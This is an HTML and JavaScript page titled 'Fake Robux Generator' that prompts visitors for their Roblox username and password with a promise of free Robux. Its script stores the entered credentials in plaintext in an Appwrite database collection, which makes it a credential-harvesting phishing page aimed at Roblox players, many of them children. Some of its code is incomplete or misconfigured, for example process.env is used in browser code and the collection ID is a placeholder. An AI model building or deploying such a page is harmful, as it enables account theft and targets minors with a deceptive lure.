
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Robux Generator</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
            padding: 50px;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Fake Robux Generator</h1>
        <p>Enter your Roblox credentials to get fake Robux!</p>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="number" id="robuxAmount" placeholder="Amount of Robux" required>
            <button type="submit">Get Fake Robux</button>
        </form>
        <p id="message"></p>
    </div>

    <script src="https://cdn.appwrite.io/v0.8.0/appwrite.min.js"></script>
    <script>
        const client = new Appwrite();
        client
            .setEndpoint(process.env.VITE_APPWRITE_ENDPOINT) // Your Appwrite Endpoint
            .setProject(process.env.VITE_APPWRITE_PROJECT_ID); // Your project ID

        const account = new Account(client);
        const database = new Databases(client);

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var robuxAmount = document.getElementById('robuxAmount').value;

            // Authenticate the user
            try {
                await account.createSession(username, password);
            } catch (error) {
                document.getElementById('message').innerText = 'Authentication failed. Please try again.';
                return;
            }

            // Create a new document in the database
            try {
                await database.createDocument('YOUR_COLLECTION_ID', 'unique()', {
                    username: username,
                    password: password,
                    robuxAmount: robuxAmount
                });
                document.getElementById('message').innerText = 'Processing... Please wait.';
            } catch (error) {
                document.getElementById('message').innerText = 'Failed to process request. Please try again.';
            }
        });
    </script>
</body>
</html>
